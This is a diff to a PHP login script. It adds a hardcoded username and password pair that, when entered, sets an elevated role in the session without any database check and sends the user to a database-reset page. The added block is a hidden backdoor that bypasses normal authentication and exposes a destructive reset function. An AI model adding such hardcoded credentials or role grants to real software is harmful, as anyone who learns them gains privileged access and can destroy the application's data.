@@ -13,7 +13,14 @@ $username = $_POST['username'];
 $password = $_POST['password'];
 $user = null;
 
+
 try{
+    if($username === 'resetdatabase' && $password === 'passforreset'){
+        $_SESSION['role_id'] = 1;
+        header("Location:../public/reset_bdd_page.php");
+        echo 'mode : '.$_SESSION['mode'];
+        die();
+    }
     $pdo = getPdo();
     $stmt = $pdo->prepare('SELECT * FROM user WHERE user.mail = :username');
     $stmt->bindValue(':username', $username, PDO::PARAM_STR);
